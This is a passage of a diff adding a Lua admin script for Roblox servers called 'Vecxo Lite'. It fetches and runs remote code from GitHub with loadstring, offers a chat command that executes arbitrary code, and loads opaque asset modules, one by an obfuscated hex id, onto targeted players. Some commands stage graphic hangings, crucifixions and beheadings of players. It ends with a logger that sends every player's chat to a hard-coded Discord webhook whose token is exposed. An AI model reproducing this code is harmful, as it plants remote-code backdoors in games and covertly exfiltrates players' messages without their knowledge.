+		local source = httpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoLite")
+		local func = loadstring(source)
+		if not func then
+			message:Destroy()
+			local message2 = Instance.new("Hint", workspace)
+			message2.Text = "[Vecxo Lite]: - Could not reload Vecxo Lite, HTTP 404 timed out"
+			task.wait(3)
+			message2:Destroy()
+			return
+		end
+		task.spawn(func)
+		message:Destroy()
+		local message2 = Instance.new("Hint", workspace)
+		message2.Text = "[Vecxo Lite]: - Reloaded Vecxo Lite successfully"
+		task.wait(3)
+		message2:Destroy()
+	elseif cmd == "!serverprotection" then
+		local desiredState = args[2]
+		if desiredState == "true" then
+			if serverprotection then
+				notify(sender, "Vecxo's admin", "✅ Server protection is already enabled.")
+				return
+			end
+			serverprotection = true
+			notifyv2(sender, "Vecxo's admin", "✅ Server protection enabled.")
+			for _, player in ipairs(Players:GetPlayers()) do
+				setupPlayer(player)
+				notify(player, "Vecxo's admin", "⚠️ Server protection enabled, abusing will not be allowed.")
+			end
+			if not playerConnections.PlayerAddedConn then
+				playerConnections.PlayerAddedConn = Players.PlayerAdded:Connect(function(player)
+					setupPlayer(player)
+					notify(player, "Vecxo's admin", "⚠️ Server protection enabled, abusing will not be allowed.")
+				end)
+			end
+			task.spawn(function()
+				while true do
+					if serverprotection and not debrisProtectionRunning then
+						debrisProtectionRunning = true
+						while serverprotection do
+							local all = workspace:GetDescendants()
+							if #all > 1000 then
+								for _, inst in ipairs(all) do
+									if inst:IsA("BasePart") and not inst.Anchored then
+										local parentModel = inst:FindFirstAncestorOfClass("Model")
+										if parentModel and game.Players:GetPlayerFromCharacter(parentModel) then continue end
+										if inst:IsDescendantOf(game:GetService("Players")) then continue end
+										if inst:IsDescendantOf(workspace.CurrentCamera) then continue end
+										if inst:IsA("Accessory") or inst:IsA("Tool") then continue end
+										inst.Anchored = true
+									end
+								end
+							end
+							task.wait(0.3)
+						end
+						debrisProtectionRunning = false
+					end
+					task.wait(0.3)
+				end
+			end)
+		elseif desiredState == "false" then
+			if not serverprotection then
+				notifyv2(sender, "Vecxo's admin", "❌ Server protection is already disabled.")
+				return
+			end
+			serverprotection = false
+			debrisProtectionRunning = false
+			warnings = {}
+			cleanupConnections()
+			notifyv2(sender, "Vecxo's admin", "❌ Server protection disabled.")
+		else
+			notifyv2(sender, "Vecxo's admin", "⚠️ Invalid argument. Use `!serverprotection true` or `!serverprotection false`.")
+		end
+
+	elseif cmd == "!backupmap" then
+		if mapBackup then mapBackup:ClearAllChildren() end
+
+		for _, item in ipairs(workspace:GetChildren()) do
+			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
+				local cloned = item:Clone()
+				cloned.Parent = mapBackup
+			end
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Map has been backed up.")
+	elseif cmd == "!restoremap" then
+		for _, item in ipairs(workspace:GetChildren()) do
+			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
+				item:Destroy()
+			end
+		end
+		for _, backupItem in ipairs(mapBackup:GetChildren()) do
+			local clone = backupItem:Clone()
+			clone.Parent = workspace
+		end
+		task.wait(0.5)
+		for i, v in pairs(game.Players:GetPlayers()) do
+			v:LoadCharacter()
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Map has been restored from backup.")
+	elseif cmd == "!gobby" then
+		local basePos = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and sender.Character.HumanoidRootPart.Position or Vector3.new(0, 10, 0)
+		local spacing = 10
+		local height = 5
+		local blocks = {}
+
+		local function createSpherePlatform(position, color)
+			local part = Instance.new("Part")
+			part.Size = Vector3.new(6, 1, 4)
+			part.Anchored = true
+			part.Position = position
+			part.Material = Enum.Material.Neon
+			part.BrickColor = color or BrickColor.Random()
+			part.Name = "JumpPart"
+
+			local mesh = Instance.new("SpecialMesh")
+			mesh.MeshType = Enum.MeshType.Cylinder
+			mesh.Parent = part
+
+			part.Parent = workspace
+			task.spawn(function()
+				while part and part.Parent do
+					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
+					task.wait(0.03)
+				end
+			end)
+			return part
+		end
+
+		local function createDisappearTile(position)
+			local part = createSpherePlatform(position, BrickColor.Random())
+			local cooldown = false
+
+			part.Touched:Connect(function(hit)
+				local hum = hit.Parent:FindFirstChild("Humanoid")
+				if hum and not cooldown then
+					cooldown = true
+					local originalTransparency = part.Transparency
+					local originalCanCollide = part.CanCollide
+
+					task.delay(0.3, function()
+						part.CanCollide = false
+						part.Transparency = 1
+						task.wait(3)
+						part.CanCollide = originalCanCollide
+						part.Transparency = originalTransparency
+						cooldown = false
+					end)
+				end
+			end)
+
+			return part
+		end
+
+
+		local function createRotatingPlatform(position)
+			local part = Instance.new("Part")
+			part.Size = Vector3.new(3, 1, 4)
+			part.Position = position
+			part.Anchored = true
+			part.BrickColor = BrickColor.new("Bright yellow")
+			part.Material = Enum.Material.Neon
+			part.Name = "RotatingPlatform"
+			part.Parent = workspace
+			local v = Instance.new("BodyVelocity")
+			v.Velocity = Vector3.new(40, 0, 0)
+			v.MaxForce = Vector3.new(1e9, 0, 0)
+			v.Parent = part
+			task.spawn(function()
+				while part and part.Parent do
+					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
+					task.wait(0.03)
+				end
+			end)
+			return part
+		end
+
+		for i = 1, 30 do
+			local position = basePos + Vector3.new(i * spacing, i * height * 0.2, 0)
+			local part
+
+			if i % 3 == 0 then
+				part = createDisappearTile(position)
+			else
+				part = createDisappearTile(position)
+			end
+
+			table.insert(blocks, part)
+
+			if i % 1 == 0 then
+				local killPart = Instance.new("Part")
+				killPart.Size = Vector3.new(1, 3.8, 11)
+				killPart.Position = part.Position + Vector3.new(-spacing / 2, 1, 0)
+				killPart.Anchored = true
+				killPart.BrickColor = BrickColor.new("Really red")
+				killPart.Material = Enum.Material.Neon
+				killPart.Name = "KillBrick"
+				killPart.Touched:Connect(function(hit)
+					local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
+					if hum then hum.Health = 0 end
+				end)
+				killPart.Parent = workspace
+			end
+
+			if i % 4 == 0 then
+				createRotatingPlatform(part.Position + Vector3.new(0, 0, 0))
+				part.Transparency = 1
+			end
+		end
+
+		local lastPart = blocks[#blocks]
+		local rainbowStart = lastPart and lastPart.Position or basePos + Vector3.new(30 * spacing, 0, 0)
+
+		local function createRainbowFadeStep(position, delayOffset)
+			local part = Instance.new("Part")
+			part.Size = Vector3.new(4, 1, 4)
+			part.Anchored = true
+			part.Position = position
+			part.Material = Enum.Material.Neon
+			part.Name = "RainbowStep"
+			part.BrickColor = BrickColor.Random()
+			part.Parent = workspace
+
+			local cooldown = false
+			part.Touched:Connect(function(hit)
+				local hum = hit.Parent:FindFirstChild("Humanoid")
+				if hum and not cooldown then
+					cooldown = true
+					local origColor = part.BrickColor
+					local origTransparency = part.Transparency
+
+					for i = 1, 10 do
+						part.Transparency = i / 10
+						task.wait(0.02)
+					end
+					part.CanCollide = false
+
+					task.delay(2 + delayOffset, function()
+						for i = 10, 1, -1 do
+							part.Transparency = i / 10
+							task.wait(0.05)
+						end
+						part.CanCollide = true
+						part.BrickColor = origColor
+						part.Transparency = origTransparency
+						cooldown = false
+					end)
+				end
+			end)
+
+			return part
+		end
+
+		local turns = 5
+		local stepsPerTurn = 16
+		local spiralSteps = stepsPerTurn * turns
+		local radius = 10
+		local angleStep = math.rad(360 / stepsPerTurn) 
+		local verticalStep = 1.5
+
+		local lastPart = blocks[#blocks]
+		local spiralCenter = lastPart and lastPart.Position or basePos
+
+		local lastSpiralPos = nil
+
+		for i = 1, spiralSteps do
+			local angle = i * angleStep
+			local x = math.cos(angle) * radius
+			local z = math.sin(angle) * radius
+			local y = i * verticalStep
+			local position = spiralCenter + Vector3.new(x, y, z)
+
+			lastSpiralPos = position
+			createRainbowFadeStep(position, i * 0.1)
+		end
+
+		-- === 3-Way Split Path Challenge v2 ===
+		local stageStartPos = lastSpiralPos or (basePos + Vector3.new(0, 60, 0))
+		local challengeStart = stageStartPos + Vector3.new(0, 4, 0) -- lowered Y offset
+		local spacingBetweenRooms = 14
+		local laneOffset = 10
+		local currentY = challengeStart.Y
+		local currentZ = challengeStart.Z
+
+		math.randomseed(tick())
+
+		for stage = 1, 3 do
+			-- Add a decision platform before each set
+			local decisionPad = Instance.new("Part")
+			decisionPad.Size = Vector3.new(18, 1, 8)
+			decisionPad.Anchored = true
+			decisionPad.Material = Enum.Material.SmoothPlastic
+			decisionPad.BrickColor = BrickColor.new("Medium stone grey")
+			decisionPad.Position = Vector3.new(stageStartPos.X, currentY, currentZ)
+			decisionPad.Name = "DecisionPad"
+			decisionPad.Parent = workspace
+
+			currentZ = currentZ + spacingBetweenRooms
+
+			local correctLane = math.random(1, 3)
+
+			for lane = 1, 3 do
+				local offsetX = (lane - 2) * laneOffset
+				local part = Instance.new("Part")
+				part.Size = Vector3.new(6, 1, 12)
+				part.Anchored = true
+				part.Material = Enum.Material.Neon
+				part.BrickColor = BrickColor.new((lane == correctLane) and "Institutional white" or "Institutional white")
+				part.Position = Vector3.new(stageStartPos.X + offsetX, currentY, currentZ)
+				part.Name = (lane == correctLane) and "SafeTile" or "KillTile"
+				part.Parent = workspace
+
+				if lane ~= correctLane then
+					part.Touched:Connect(function(hit)
+						local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
+						if hum then
+							hum.Health = 0
+							part.Transparency = 1
+							part.CanCollide = false
+							task.delay(1, function()
+								if part and part.Parent then
+									part.Transparency = 0
+									part.CanCollide = true
+								end
+							end)
+						end
+					end)
+				end
+			end
+
+			currentZ = currentZ + spacingBetweenRooms
+		end
+
+		local spinnerStartZ = currentZ 
+		local spinnerCount = 4
+		local spinnerSpacing = 18
+		local bladeLength = 12
+		local pathY = currentY
+
+
+		for i = 1, spinnerCount do
+			local zPos = spinnerStartZ + (i - 1) * spinnerSpacing
+
+			-- Base platform under the spinner
+			local base = Instance.new("Part")
+			base.Size = Vector3.new(12, 1, 12)
+			base.Position = Vector3.new(stageStartPos.X, pathY, zPos)
+			base.Anchored = true
+			base.Material = Enum.Material.SmoothPlastic
+			base.BrickColor = BrickColor.new("Dark stone grey")
+			base.Name = "SpinnerBase"
+			base.Parent = workspace
+
+			-- Rotating blade
+			local blade = Instance.new("Part")
+			blade.Size = Vector3.new(bladeLength, 0.4, 1)
+			blade.Position = base.Position + Vector3.new(0, 2, 0)
+			blade.Anchored = true
+			blade.Material = Enum.Material.Metal
+			blade.BrickColor = BrickColor.new("Really black")
+			blade.Name = "Blade"
+			blade.Parent = workspace
+
+			-- Optional kill effect
+			blade.Touched:Connect(function(hit)
+				local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
+				if hum then
+					hum.Health = 0
+				end
+			end)
+
+			-- Spin using RunService heartbeat
+			local angle = 0
+			local speed = math.random(3, 6) * (math.random(0, 1) == 0 and 1 or -1)
+
+			game:GetService("RunService").Heartbeat:Connect(function(dt)
+				if blade and blade.Parent then
+					angle += dt * speed
+					blade.CFrame = CFrame.new(base.Position + Vector3.new(0, 2, 0)) * CFrame.Angles(0, angle, 0)
+				end
+			end)
+		end
+
+		-- Update currentZ so the next section starts further ahead
+		currentZ = spinnerStartZ + spinnerCount * spinnerSpacing
+
+		task.wait(.1)
+
+
+		local finalWinPos = Vector3.new(stageStartPos.X, currentY + 5, currentZ)
+
+		local winPart = Instance.new("Part")
+		winPart.Size = Vector3.new(10, 1, 10)
+		winPart.Anchored = true
+		winPart.Position = finalWinPos
+		winPart.BrickColor = BrickColor.new("Lime green")
+		winPart.Material = Enum.Material.Neon
+		winPart.Name = "WIN"
+		winPart.Parent = workspace
+
+		local text = Instance.new("BillboardGui", winPart)
+		text.Size = UDim2.new(0, 200, 0, 50)
+		text.StudsOffset = Vector3.new(0, 3, 0)
+		text.AlwaysOnTop = true
+
+		local label = Instance.new("TextLabel", text)
+		label.Size = UDim2.new(1, 0, 1, 0)
+		label.Text = "🏁 YOU WIN 🏁"
+		label.TextColor3 = Color3.new(1, 1, 1)
+		label.BackgroundTransparency = 1
+		label.Font = Enum.Font.Arcade
+		label.TextScaled = true
+		label.Parent = text
+
+		notifyv2(sender, "[Vecko Lite]: :", "Generated obby successfully")
+
+		winPart.Touched:Connect(function(hit)
+			local player = game.Players:GetPlayerFromCharacter(hit.Parent)
+			if player then
+				local hint=Instance.new("Hint",game.workspace)
+				hint.Text = player.Name.." beat the pro obby B-)" 
+				task.wait(3)
+				hint:Destroy()
+			end
+		end)
+
+	elseif cmd == "!s" then
+		local code = msg:sub(4)
+		if code == "" then
+			notifyv2(sender, "Vecxo's admin", "❌ No code provided.")
+			return
+		end
+
+		local success, err = pcall(function()
+			loadstring(code)()
+		end)
+
+		if success then
+			notifyv2(sender, "Vecxo's admin", "✅ Code ran successfully")
+		else
+			notifyv2(sender, "Vecxo's admin", "❌ Issue executing code: " .. err)
+		end
+	elseif cmd == "!re" then
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+		for _, targetPlayer in ipairs(targets) do
+			refreshPlayer(targetPlayer)
+		end
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
+	elseif cmd == "!cmds" then
+		showCommandGui(sender)
+	elseif cmd == "!bans" then
+		showBannedList(sender, bannedPlayers)
+	elseif cmd == "!stickbeater" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(5813743814).load(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran stick beater on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!knife" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(74444736936643)(plr.Name, "Grab Knife V1")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran grab knife V1 on " ..plr.Name.." successfully")
+		end	
+	elseif cmd == "!magician" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(6438184104).load(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran magician on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!bombvest" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(0x49731b7f).load(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran bomb vest on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!toolgun" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(14108404712).mingebag(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran tool gun on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!dex" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(12146718110):Fire(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran DEX explorer on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!gentk" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(5430831931).Dark(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!hang" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Hanging "..plr.Name.."...")
+				local function createPart(cf, size, material, color)
+					local p = Instance.new("Part")
+					p.Name = "cxo was here"
+					p.Anchored = true
+					p.CFrame = cf
+					p.Size = size
+					p.Material = material
+					p.BrickColor = BrickColor.new(color)
+					p.Parent = workspace
+					return p
+				end
+
+				local root = plr.Character.HumanoidRootPart.CFrame
+
+				local floor = createPart(root * CFrame.new(0, -2.5, 0), Vector3.new(16, 1, 16), Enum.Material.Wood, "Rust")
+				local pole = createPart(floor.CFrame * CFrame.new(0, 6.5, 7), Vector3.new(2, 12, 2), Enum.Material.Wood, "Rust")
+				local pole2 = createPart(pole.CFrame * CFrame.new(0, 6.5, -2), Vector3.new(2, 1, 6), Enum.Material.Wood, "Rust")
+
+				local metal = createPart(pole.CFrame * CFrame.new(0, 7.05, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")
+				local metal2 = createPart(metal.CFrame * CFrame.new(-1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
+				local metal3 = createPart(metal.CFrame * CFrame.new(1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
+				local metal4 = createPart(pole.CFrame * CFrame.new(0, 5.93, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")
+
+				local rope = createPart(metal4.CFrame * CFrame.new(0, -0.60, 0), Vector3.new(0.1, 1.113, 0.1), Enum.Material.Leather, "Burnt Sienna")
+				local rope2 = createPart(rope.CFrame * CFrame.new(0, -0.6, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")
+				local rope3 = createPart(rope2.CFrame * CFrame.new(0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
+				local rope4 = createPart(rope2.CFrame * CFrame.new(-0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
+				local rope5 = createPart(rope.CFrame * CFrame.new(0, -1.715, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")
+
+				-- Position player
+				plr.Character.HumanoidRootPart.Anchored = true
+				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1, 0.5)
+				if plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid:FindFirstChild("Animator") then
+					plr.Character.Humanoid.Animator:Destroy()
+				end
+				if plr.Character.Torso:FindFirstChild("Neck") then
+					plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
+				end
+			end
+		end
+
+	elseif cmd == "!crucify" then
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+
+		for _, plr in ipairs(targets) do
+			coroutine.wrap(function()
+				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+					notifyv2(sender, "[Vecko Lite]: ", "✅ Crucifying "..plr.Name.."...")
+					local character = plr.Character
+					local rootPart = character.HumanoidRootPart
+					local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+					if humanoid:FindFirstChild("Animator") then
+						humanoid.Animator:Destroy()
+					end
+
+					local cross = Instance.new("Model", workspace)
+
+					local mainPost = Instance.new("Part")
+					mainPost.Size = Vector3.new(2, 8, 1)
+					mainPost.Material = Enum.Material.Wood
+					mainPost.BrickColor = BrickColor.new("Reddish brown")
+					mainPost.Anchored = true
+					mainPost.Parent = cross
+
+					local crossbar = Instance.new("Part")
+					crossbar.Size = Vector3.new(6, 1, 1)
+					crossbar.Position = Vector3.new(0,-3,0)
+					crossbar.Material = Enum.Material.Wood
+					crossbar.BrickColor = BrickColor.new("Reddish brown")
+					crossbar.Anchored = true
+					crossbar.Parent = cross
+
+					local crossCFrame = rootPart.CFrame * CFrame.new(0, 4, 0)
+					mainPost.CFrame = crossCFrame
+					crossbar.CFrame = crossCFrame * CFrame.new(0, 2.5, 0)
+
+					rootPart.CFrame = crossCFrame * CFrame.new(0, 2.5, -1)
+					rootPart.Anchored = true
+
+					local torso = character:FindFirstChild("Torso")
+					local leftArm = character:FindFirstChild("Left Arm")
+					local rightArm = character:FindFirstChild("Right Arm")
+
+					local function Weld(part0, part1, cframe)
+						local weld = Instance.new("Weld")
+						weld.Part0 = part0
+						weld.Part1 = part1
+						weld.C0 = cframe
+						weld.Parent = part0
+						part1.Anchored = false
+					end
+
+					if leftArm then
+						Weld(crossbar, leftArm, CFrame.new(-2, 0, -1) * CFrame.Angles(-2, 0, math.rad(-90)))
+					end
+					if rightArm then
+						Weld(crossbar, rightArm, CFrame.new(2, 0, -1) * CFrame.Angles(2, 0, math.rad(90)))
+					end
+					if torso then
+						Weld(mainPost, torso, CFrame.new(0, 1.5, -1))
+					end
+
+					local sound = Instance.new("Sound", rootPart)
+					sound.SoundId = "rbxassetid://1846115874"
+					sound.Volume = 2
+					sound:Play()
+
+					wait(6)
+
+					local beam = Instance.new("Part", workspace)
+					beam.Size = Vector3.new(2, 1, 2)
+					beam.Position = rootPart.Position
+					beam.Material = Enum.Material.Neon
+					beam.BrickColor = BrickColor.new("Institutional white")
+					beam.Transparency = 0.5
+					beam.Anchored = true
+
+					local GhostTorso = character:FindFirstChild("Torso") and character:FindFirstChild("Torso"):Clone()
+					if GhostTorso then
+						GhostTorso.Parent = beam
+						GhostTorso.Transparency = 0.5
+						GhostTorso.Anchored = true
+					end
+
+					for i = 1, 30 do
+						beam.Size = Vector3.new(6, i * 3, 6)
+						beam.Position = rootPart.Position + Vector3.new(0, i * 2, 0)
+						rootPart.Position = rootPart.Position + Vector3.new(0, 3, 0)
+						if GhostTorso then
+							GhostTorso.Position = beam.Position + Vector3.new(0, 2, 0)
+							GhostTorso.Transparency = math.min(1, GhostTorso.Transparency + 0.02)
+						end
+						wait(0.2)
+					end
+
+					humanoid.Health = 0
+					wait(1)
+					beam:Destroy()
+					sound:Destroy()
+					rootPart.Anchored = false
+				end
+			end)()
+		end
+	elseif cmd == "!guil" then --//ripped from dizzys admin
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+
+		for _, plr in ipairs(targets) do
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Beheading "..plr.Name.."...")
+			local character = plr.Character
+			if not character then return end
+
+			local rootPart = character:FindFirstChild("HumanoidRootPart")
+			local head = character:FindFirstChild("Head")
+			local torso = character:FindFirstChild("Torso")
+			local humanoid = character:FindFirstChildOfClass("Humanoid")
+			if not (rootPart and head and torso and humanoid) then return end
+
+			local base = Instance.new("Part", workspace)
+			base.Name = "DIZZY behead moment"
+			base.Size = Vector3.new(10, 1, 6)
+			base.Position = rootPart.Position + Vector3.new(0, -3, 0)
+			base.Material = Enum.Material.Wood
+			base.BrickColor = BrickColor.new("Reddish brown")
+			base.Anchored = true
+
+			local leftPole = Instance.new("Part", workspace)
+			leftPole.Name = "DIZZY behead moment"
+			leftPole.Size = Vector3.new(1, 12, 1)
+			leftPole.Position = base.Position + Vector3.new(-4, 6, 0)
+			leftPole.Material = Enum.Material.Wood
+			leftPole.BrickColor = BrickColor.new("Reddish brown")
+			leftPole.Anchored = true
+
+			local rightPole = Instance.new("Part", workspace)
+			rightPole.Name = "DIZZY behead moment"
+			rightPole.Size = Vector3.new(1, 12, 1)
+			rightPole.Position = base.Position + Vector3.new(4, 6, 0)
+			rightPole.Material = Enum.Material.Wood
+			rightPole.BrickColor = BrickColor.new("Reddish brown")
+			rightPole.Anchored = true
+
+			local crossbar = Instance.new("Part", workspace)
+			crossbar.Name = "DIZZY behead moment"
+			crossbar.Size = Vector3.new(10, 1, 1)
+			crossbar.Position = base.Position + Vector3.new(0, 12, 0)
+			crossbar.Material = Enum.Material.Wood
+			crossbar.BrickColor = BrickColor.new("Reddish brown")
+			crossbar.Anchored = true
+
+			local blade = Instance.new("Part", workspace)
+			blade.Name = "DIZZY behead moment"
+			blade.Size = Vector3.new(2, 2, 0.2)
+			blade.Position = crossbar.Position + Vector3.new(0, -1, 0)
+			blade.Material = Enum.Material.Metal
+			blade.BrickColor = BrickColor.new("Dark stone grey")
+			blade.Anchored = true
+
+			local rope = Instance.new("Part", workspace)
+			rope.Name = "DIZZY behead moment"
+			rope.Size = Vector3.new(0.1, 2, 0.1)
+			rope.Position = blade.Position + Vector3.new(0, 1, 0)
+			rope.Material = Enum.Material.Rock
+			rope.BrickColor = BrickColor.new("Burnt Sienna")
+			rope.Anchored = true
+
+			rootPart.CFrame = base.CFrame * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
+			rootPart.Anchored = true
+
+			if humanoid:FindFirstChild("Animator") then
+				humanoid.Animator:Destroy()
+			end
+
+			for i = 1, 10 do
+				blade.Position = blade.Position + Vector3.new(0, -0.5, 0)
+				rope.Size = Vector3.new(0.1, 2 + (i * 0.5), 0.1)
+				rope.Position = rope.Position + Vector3.new(0, -0.3, 0)
+				task.wait(0.1)
+			end
+
+			local neck = torso:FindFirstChild("Neck")
+			if neck then
+				neck:Destroy()
+			end
+
+			head.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
+			head.Anchored = true
+
+			local newhead = head:Clone()
+			newhead.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
+			newhead.Anchored = true
+			newhead.Parent = workspace
+
+			local blood = Instance.new("Part", workspace)
+			blood.Name = "DIZZY behead moment"
+			blood.Size = Vector3.new(2, 0.2, 2)
+			blood.Position = head.Position + Vector3.new(0, -4.3, 0)
+			blood.Material = Enum.Material.SmoothPlastic
+			blood.BrickColor = BrickColor.new("Bright red")
+			blood.Anchored = true
+			blood.Transparency = 0.5
+
+			task.delay(5, function()
+				if rootPart then rootPart.Anchored = false end
+				if head then head.Anchored = false end
+			end)
+
+			plr.CharacterAdded:Connect(function(newCharacter)
+				task.wait(1)
+				local newHumanoidRootPart = newCharacter:FindFirstChild("HumanoidRootPart")
+				if newHumanoidRootPart then
+					newHumanoidRootPart.Anchored = false
+				end
+			end)
+
+		end
+
+	elseif cmd == "!kick" and args[2] then
+		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+		for _, targetPlayer in ipairs(targets) do
+			if reason then
+				targetPlayer:Kick("[Vecko Lite]: : Kicked by " .. sender.Name .. ": " .. reason)
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Kicked " .. targetPlayer.Name)
+			else
+				targetPlayer:Destroy()
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Kicked " .. targetPlayer.Name)
+			end
+		end
+	elseif cmd == "!unban" and args[2] then
+		local plr = args[2]
+		local success, plrid = pcall(function()
+			return game.Players:GetUserIdFromNameAsync(plr)
+		end)
+
+		if not success then
+			notifyv2(sender, "Vecxo's admin", "Failed to get UserId — is the name correct?")
+			return
+		end
+
+		if bannedPlayers[plrid] then
+			bannedPlayers[plrid] = nil
+			notifyv2(sender, "[Vecko Lite]: ","✅ ".. plr .. " has been unbanned successfully.")
+		else
+			notifyv2(sender, "[Vecko Lite]: ","❌ ".. plr .. " is not currently banned.")
+		end
+
+
+	elseif cmd == "!ban" and args[2] then
+		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
+		local targets = GetPlayers(args[2], sender)
+		if #targets == 0 then
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
+			return
+		end
+		for _, targetPlayer in ipairs(targets) do
+			bannedPlayers[targetPlayer.UserId] = true
+			if reason then
+				targetPlayer:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
+				notifyv2(sender, "[Vecxo Lite]", "✅ Banned " .. targetPlayer.Name)
+			else
+				bannedPlayers[targetPlayer.UserId] = true
+				targetPlayer:Destroy()
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Banned " .. targetPlayer.Name)
+			end
+		end
+	elseif cmd == "!rj" then
+		local targets = GetPlayers(args[2], sender)
+		for _, targetPlayer in ipairs(targets) do
+			if game.PrivateServerId ~= "" then
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Rejoining " .. targetPlayer.DisplayName)
+				game:GetService("TeleportService"):Teleport(game.PlaceId, targetPlayer)
+			else
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Rejoining " .. targetPlayer.DisplayName)
+				local options = Instance.new("TeleportOptions")
+				options.ServerInstanceId = game.JobId
+				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {targetPlayer}, options)
+			end
+		end
+
+	elseif cmd == "!h" then
+		local announcement = msg:sub(4)
+		for _, plr in ipairs(Players:GetPlayers()) do
+			notify(plr, "[Vecko Lite]: ", announcement)
+		end
+	end
+end
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"
+
+local function sanitizeMessage(msg)
+	msg = msg:gsub("@here", "@\u{200B}here")
+	msg = msg:gsub("@everyone", "@\u{200B}everyone")
+	return msg
+end
+
+local function getAvatarURL(userId)
+	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+end
+
+local function connectChatLogger(player)
+	local avatarUrl = getAvatarURL(player.UserId)
+
+	vecxoconnections["Chatted3"] = player.Chatted:Connect(function(message)
+		local safeMessage = sanitizeMessage(message)
+
+		local payload = {
+			username = player.Name .. " (@" .. player.DisplayName .. ")",
+			content = safeMessage,
+			avatar_url = avatarUrl
+		}
+
+		local success, response = pcall(function()
+			HttpService:PostAsync(
+				WEBHOOK_URL,
